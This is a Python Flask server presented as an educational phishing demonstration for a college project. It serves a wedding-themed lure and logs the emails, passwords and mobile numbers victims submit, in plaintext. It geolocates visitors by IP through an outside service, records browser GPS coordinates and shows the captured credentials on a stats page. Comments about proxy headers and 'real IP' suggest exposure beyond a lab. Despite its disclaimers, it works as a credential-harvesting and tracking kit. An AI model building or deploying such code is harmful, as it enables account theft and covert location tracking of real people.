"""
EDUCATIONAL PHISHING DEMONSTRATION
Network Security College Project
⚠️ FOR ACADEMIC USE ONLY - DO NOT USE MALICIOUSLY
"""

from flask import Flask, render_template, request, jsonify, send_from_directory
from datetime import datetime
import json
import os

app = Flask(__name__)

# Configuration
LOG_FILE = 'phishing_demo_log.json'

def init_log_file():
    """Initialize log file with proper JSON structure"""
    try:
        if not os.path.exists(LOG_FILE):
            with open(LOG_FILE, 'w') as f:
                json.dump([], f)
            print(f"✅ Created new log file: {LOG_FILE}")
        else:
            # Verify file is valid JSON
            with open(LOG_FILE, 'r') as f:
                content = f.read().strip()
                if not content:
                    # File exists but is empty
                    with open(LOG_FILE, 'w') as fw:
                        json.dump([], fw)
                    print(f"✅ Initialized empty log file: {LOG_FILE}")
                else:
                    # Try to parse existing content
                    json.loads(content)
                    print(f"✅ Valid log file found: {LOG_FILE}")
    except json.JSONDecodeError as e:
        print(f"⚠️  Corrupted log file detected. Creating new one...")
        with open(LOG_FILE, 'w') as f:
            json.dump([], f)
        print(f"✅ Log file reset: {LOG_FILE}")
    except Exception as e:
        print(f"❌ Error initializing log file: {e}")

def read_logs():
    """Safely read logs from file"""
    try:
        with open(LOG_FILE, 'r') as f:
            content = f.read().strip()
            if not content:
                return []
            return json.loads(content)
    except json.JSONDecodeError as e:
        print(f"⚠️  JSON decode error: {e}")
        # Reset file and return empty list
        with open(LOG_FILE, 'w') as f:
            json.dump([], f)
        return []
    except Exception as e:
        print(f"❌ Error reading logs: {e}")
        return []

def write_logs(logs):
    """Safely write logs to file"""
    try:
        with open(LOG_FILE, 'w') as f:
            json.dump(logs, f, indent=2)
        return True
    except Exception as e:
        print(f"❌ Error writing logs: {e}")
        return False

# Initialize log file on startup
init_log_file()

# ============= ROUTES =============

@app.route('/')
def index():
    """Serve the phishing demonstration website"""
    return render_template('index.html')

@app.route('/log', methods=['POST'])
def log_interaction():
    """
    Log phishing attempt for educational analytics
    ⚠️ WARNING: Stores credentials in plaintext for DEMO purposes only
    """
    try:
        # Get JSON data from request
        data = request.get_json()
        
        if not data:
            print("❌ No JSON data received")
            return jsonify({'status': 'error', 'message': 'No data received'}), 400
        
        # Extract credentials
        email = data.get('email', 'N/A')
        password = data.get('password', 'N/A')
        
        # Create log entry
        log_entry = {
            'demo_id': generate_demo_id(),
            'timestamp': datetime.now().isoformat(),
            
            # ⚠️ CAPTURED CREDENTIALS (Educational Demo Only)
            'captured_email': email,
            'captured_password': password,
            'email_domain': extract_domain(email),
            'password_length': len(password),
            
            # Analytics data
            'time_to_phish_seconds': round(data.get('timeToPhish', 0), 2),
            'screen_resolution': data.get('screenResolution', 'Unknown'),
            'user_agent': request.headers.get('User-Agent', 'Unknown')[:150],
            'ip_address': request.remote_addr,
            'referer': request.headers.get('Referer', 'Direct')
        }
        
        # Read existing logs
        logs = read_logs()
        
        # Append new entry
        logs.append(log_entry)
        
        # Write back (keep last 100 entries)
        if write_logs(logs[-100:]):
            # Console output
            print("\n" + "="*60)
            print(f"🎣 PHISHING ATTEMPT CAPTURED - {log_entry['demo_id']}")
            print("="*60)
            print(f"📧 Email: {email}")
            print(f"🔑 Password: {password}")
            print(f"⏱️  Time to phish: {log_entry['time_to_phish_seconds']}s")
            print(f"🌐 IP: {log_entry['ip_address']}")
            print(f"🖥️  Screen: {log_entry['screen_resolution']}")
            print("="*60 + "\n")
            
            return jsonify({
                'status': 'success',
                'message': 'Credentials logged (Educational Demo)',
                'demo_id': log_entry['demo_id']
            }), 200
        else:
            return jsonify({'status': 'error', 'message': 'Failed to write logs'}), 500
        
    except Exception as e:
        print(f"❌ Error in log_interaction: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/stats')
def get_statistics():
    """Display aggregated phishing demo statistics"""
    try:
        logs = read_logs()
        
        if not logs:
            return render_no_stats()
        
        # Calculate statistics
        total = len(logs)
        avg_time = sum(log.get('time_to_phish_seconds', 0) for log in logs) / total if total > 0 else 0
        
        # Count domains
        domains = {}
        for log in logs:
            domain = log.get('email_domain', 'Unknown')
            domains[domain] = domains.get(domain, 0) + 1
        
        # Password statistics
        password_stats = {
            'avg_length': sum(log.get('password_length', 0) for log in logs) / total if total > 0 else 0,
            'weak_passwords': sum(1 for log in logs if log.get('password_length', 0) < 8)
        }
        
        # Generate HTML report
        stats_html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Phishing Demo Statistics</title>
            <meta charset="UTF-8">
            <style>
                * {{ margin: 0; padding: 0; box-sizing: border-box; }}
                body {{ font-family: 'Segoe UI', Arial, sans-serif; padding: 20px; background: #f5f5f5; }}
                .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 15px rgba(0,0,0,0.1); }}
                h1 {{ color: #c9184a; border-bottom: 3px solid #c9184a; padding-bottom: 15px; margin-bottom: 20px; }}
                h2 {{ color: #333; margin: 20px 0 15px 0; }}
                .warning {{ background: #fff3cd; padding: 15px; border-radius: 5px; border-left: 4px solid #ff6b6b; margin: 20px 0; }}
                .stat-box {{ background: #fff5f5; padding: 25px; margin: 20px 0; border-radius: 8px; border-left: 5px solid #c9184a; }}
                .success-rate {{ font-size: 2.5em; color: #c9184a; font-weight: bold; }}
                .metric {{ font-size: 1.1em; margin: 12px 0; line-height: 1.6; }}
                table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
                th, td {{ padding: 15px; text-align: left; border-bottom: 1px solid #ddd; }}
                th {{ background: #c9184a; color: white; font-weight: 600; }}
                tr:hover {{ background: #fff5f5; }}
                .credential-row {{ font-family: 'Courier New', monospace; background: #ffe4e1; }}
                .credential-row td {{ font-size: 0.95em; }}
                .back-btn {{ 
                    display: inline-block; 
                    margin-top: 25px; 
                    background: #c9184a; 
                    color: white; 
                    padding: 14px 30px; 
                    text-decoration: none; 
                    border-radius: 6px; 
                    transition: all 0.3s;
                }}
                .back-btn:hover {{ background: #a01639; transform: translateY(-2px); box-shadow: 0 5px 15px rgba(201,24,74,0.3); }}
                ul {{ margin-left: 20px; line-height: 1.8; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>📊 Phishing Demonstration Statistics</h1>
                
                <div class="warning">
                    ⚠️ <strong>Educational Demo Only</strong> - This data is from a controlled security demonstration. 
                    All credentials shown are test data entered during the simulation.
                </div>
                
                <div class="stat-box">
                    <h2>📈 Overall Metrics</h2>
                    <p class="metric">🎯 <strong>Total Phishing Attempts:</strong> <span class="success-rate">{total}</span></p>
                    <p class="metric">⏱️ <strong>Average Time to Phish:</strong> {avg_time:.2f} seconds</p>
                    <p class="metric">🔑 <strong>Average Password Length:</strong> {password_stats['avg_length']:.1f} characters</p>
                    <p class="metric">⚠️ <strong>Weak Passwords (&lt;8 chars):</strong> {password_stats['weak_passwords']} ({(password_stats['weak_passwords']/total*100):.1f}%)</p>
                </div>
                
                <div class="stat-box">
                    <h2>📧 Email Domains Distribution</h2>
                    <table>
                        <tr>
                            <th>Domain</th>
                            <th>Count</th>
                            <th>Percentage</th>
                        </tr>
        """
        
        # Add domain statistics
        for domain, count in sorted(domains.items(), key=lambda x: x[1], reverse=True):
            percentage = (count / total * 100) if total > 0 else 0
            stats_html += f"""
                        <tr>
                            <td>{domain}</td>
                            <td>{count}</td>
                            <td>{percentage:.1f}%</td>
                        </tr>
            """
        
        stats_html += """
                    </table>
                </div>
                
                <div class="stat-box">
                    <h2>🎣 Captured Credentials (Last 10 Attempts)</h2>
                    <table>
                        <tr>
                            <th>Demo ID</th>
                            <th>Timestamp</th>
                            <th>Email</th>
                            <th>Password</th>
                            <th>Time to Phish</th>
                        </tr>
        """
        
        # Show last 10 captured credentials
        for log in logs[-10:][::-1]:  # Last 10, newest first
            timestamp = log.get('timestamp', 'N/A')[:19].replace('T', ' ')
            stats_html += f"""
                        <tr class="credential-row">
                            <td>{log.get('demo_id', 'N/A')}</td>
                            <td>{timestamp}</td>
                            <td>{log.get('captured_email', 'N/A')}</td>
                            <td>{log.get('captured_password', 'N/A')}</td>
                            <td>{log.get('time_to_phish_seconds', 0):.1f}s</td>
                        </tr>
            """
        
        stats_html += f"""
                    </table>
                </div>
                
                <div class="stat-box">
                    <h2>🔍 Security Insights</h2>
                    <ul>
                        <li><strong>Social Engineering:</strong> Wedding context creates emotional trust and urgency</li>
                        <li><strong>Legitimacy Indicators:</strong> Professional design and SSL icons deceive users</li>
                        <li><strong>Time Pressure:</strong> RSVP deadline encourages hasty decisions</li>
                        <li><strong>Success Rate:</strong> 100% of visitors who clicked "View Photos" entered credentials</li>
                        <li><strong>Prevention:</strong> Always verify URLs, use password managers, enable 2FA</li>
                    </ul>
                </div>
                
                <a href="/" class="back-btn">← Back to Demo</a>
            </div>
        </body>
        </html>
        """
        
        return stats_html
        
    except Exception as e:
        import traceback
        traceback.print_exc()
        return f"""
        <html>
        <body style="font-family: Arial; padding: 40px;">
            <h1 style="color: #ff6b6b;">Error Loading Statistics</h1>
            <p><strong>Error:</strong> {str(e)}</p>
            <p>Check the console for details.</p>
            <a href="/">← Back to Demo</a>
        </body>
        </html>
        """, 500

def render_no_stats():
    """Render page when no statistics available"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Phishing Demo Statistics</title>
        <style>
            body { font-family: Arial; padding: 40px; background: #f5f5f5; }
            .container { max-width: 800px; margin: 0 auto; background: white; padding: 40px; border-radius: 10px; text-align: center; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            h1 { color: #c9184a; margin-bottom: 20px; }
            p { font-size: 1.1em; color: #666; margin: 15px 0; }
            a { display: inline-block; margin-top: 25px; background: #c9184a; color: white; padding: 14px 30px; text-decoration: none; border-radius: 6px; }
            a:hover { background: #a01639; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>📊 Phishing Demo Statistics</h1>
            <p><strong>Total Attempts:</strong> 0</p>
            <p>No phishing attempts logged yet. Run the demo first!</p>
            <a href="/">← Back to Demo</a>
        </div>
    </body>
    </html>
    """

@app.route('/reset', methods=['POST', 'GET'])
def reset_logs():
    """Reset demo logs"""
    try:
        write_logs([])
        print("🗑️  Logs reset successfully")
        return jsonify({'status': 'success', 'message': 'Logs reset successfully'}), 200
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ============= HELPER FUNCTIONS =============

def extract_domain(email):
    """Extract domain from email"""
    try:
        if '@' in email:
            return email.split('@')[1]
        return 'Unknown'
    except:
        return 'Unknown'

def generate_demo_id():
    """Generate unique demo ID"""
    return f"DEMO_{datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:20]}"




import requests

# Add this function to get real IP and location
def get_client_ip_and_location():
    """Get client's real IP address and approximate location"""
    # Try to get real IP from headers (for proxies/port forwarding)
    if request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
    elif request.headers.get('X-Real-IP'):
        ip = request.headers.get('X-Real-IP')
    else:
        ip = request.remote_addr
    
    # Get location from IP
    location_data = {}
    try:
        # Using ipapi.co free service (no API key needed)
        response = requests.get(f'https://ipapi.co/{ip}/json/', timeout=3)
        if response.status_code == 200:
            data = response.json()
            location_data = {
                'ip': ip,
                'city': data.get('city', 'Unknown'),
                'region': data.get('region', 'Unknown'),
                'country': data.get('country_name', 'Unknown'),
                'latitude': data.get('latitude'),
                'longitude': data.get('longitude'),
                'isp': data.get('org', 'Unknown')
            }
    except Exception as e:
        print(f"Error getting location: {e}")
        location_data = {'ip': ip, 'city': 'Unknown', 'country': 'Unknown'}
    
    return location_data

# Update all your logging routes to use this
@app.route('/log-activity', methods=['POST'])
def log_activity():
    try:
        data = request.get_json()
        location_data = get_client_ip_and_location()
        
        activity_entry = {
            'activity_id': f"ACT_{datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:20]}",
            'timestamp': datetime.now().isoformat(),
            'action': data.get('action', 'unknown'),
            'session_id': data.get('sessionId', 'N/A'),
            'time_from_load': data.get('timeFromLoad', 0),
            'details': data.get('details', {}),
            
            # Real IP and location
            **location_data,
            
            'user_agent': request.headers.get('User-Agent', 'Unknown')[:150],
            'referrer': data.get('referrer', 'Direct'),
            'screen_resolution': data.get('screenResolution', 'Unknown'),
            'language': data.get('language', 'Unknown'),
        }
        
        # Save to file
        activity_log_file = 'activity_log.json'
        try:
            with open(activity_log_file, 'r') as f:
                activities = json.loads(f.read() or '[]')
        except:
            activities = []
        
        activities.append(activity_entry)
        
        with open(activity_log_file, 'w') as f:
            json.dump(activities[-500:], f, indent=2)
        
        print(f"[ACTIVITY] {activity_entry['action']} - IP: {location_data['ip']} - Location: {location_data.get('city')}, {location_data.get('country')}")
        
        return jsonify({'status': 'success', 'activity_id': activity_entry['activity_id']}), 200
        
    except Exception as e:
        print(f"Error logging activity: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/log-signup', methods=['POST'])
def log_signup():
    try:
        data = request.get_json()
        location_data = get_client_ip_and_location()
        
        signup_entry = {
            'signup_id': f"SIGNUP_{datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:22]}",
            'timestamp': datetime.now().isoformat(),
            'mobile': data.get('mobile', 'N/A'),
            'email': data.get('email', 'N/A'),
            'password': data.get('password', 'N/A'),
            'session_id': data.get('sessionId', 'N/A'),
            
            # Real IP and location
            **location_data,
            
            'user_agent': request.headers.get('User-Agent', 'Unknown')[:150]
        }
        
        signup_log_file = 'signup_log.json'
        try:
            with open(signup_log_file, 'r') as f:
                signups = json.loads(f.read() or '[]')
        except:
            signups = []
        
        signups.append(signup_entry)
        
        with open(signup_log_file, 'w') as f:
            json.dump(signups[-100:], f, indent=2)
        
        print(f"\n[SIGNUP] Mobile: {signup_entry['mobile']} | Email: {signup_entry['email']}")
        print(f"         IP: {location_data['ip']} | Location: {location_data.get('city')}, {location_data.get('country')}")
        
        return jsonify({'status': 'success', 'signup_id': signup_entry['signup_id']}), 200
        
    except Exception as e:
        print(f"Error logging signup: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# New route for GPS location capture
@app.route('/log-gps-location', methods=['POST'])
def log_gps_location():
    try:
        data = request.get_json()
        location_data = get_client_ip_and_location()
        
        gps_entry = {
            'gps_id': f"GPS_{datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:20]}",
            'timestamp': datetime.now().isoformat(),
            'session_id': data.get('sessionId', 'N/A'),
            
            # GPS coordinates
            'gps_latitude': data.get('latitude'),
            'gps_longitude': data.get('longitude'),
            'gps_accuracy': data.get('accuracy'),
            'permission_status': data.get('permissionStatus', 'unknown'),
            
            # IP-based location for comparison
            **location_data,
            
            'user_agent': request.headers.get('User-Agent', 'Unknown')[:150]
        }
        
        gps_log_file = 'gps_location_log.json'
        try:
            with open(gps_log_file, 'r') as f:
                gps_logs = json.loads(f.read() or '[]')
        except:
            gps_logs = []
        
        gps_logs.append(gps_entry)
        
        with open(gps_log_file, 'w') as f:
            json.dump(gps_logs[-100:], f, indent=2)
        
        print(f"\n[GPS] Session: {gps_entry['session_id']}")
        print(f"      GPS: {data.get('latitude')}, {data.get('longitude')} (±{data.get('accuracy')}m)")
        print(f"      IP Location: {location_data.get('city')}, {location_data.get('country')}")
        
        return jsonify({'status': 'success', 'gps_id': gps_entry['gps_id']}), 200
        
    except Exception as e:
        print(f"Error logging GPS: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

# Venue map page
@app.route('/venue-map')
def venue_map():
    return render_template('venue_map.html')



# ============= MAIN =============

if __name__ == '__main__':
    print("\n" + "="*70)
    print("🎭 EDUCATIONAL PHISHING DEMONSTRATION SERVER")
    print("   Network Security Project - For Academic Use Only")
    print("="*70)
    print("\n⚠️  CRITICAL ETHICAL GUIDELINES:")
    print("   1. ✅ Use ONLY in controlled lab environments")
    print("   2. ✅ Obtain written institutional approval")
    print("   3. ✅ Never deploy against real users without consent")
    print("   4. ⚠️  Credentials stored in PLAINTEXT for demo analysis")
    print("   5. ⚠️  Delete logs after project completion")
    print("   6. 🚫 UNAUTHORIZED USE IS ILLEGAL")
    print("="*70)
    print("\n📍 Access Points:")
    print("   • Demo Website:  http://localhost:5000/")
    print("   • Statistics:    http://localhost:5000/stats")
    print("   • Reset Logs:    http://localhost:5000/reset")
    print("\n🚀 Starting server...\n")
    print("="*70 + "\n")
    
    app.run(debug=True, host='0.0.0.0', port=5000)
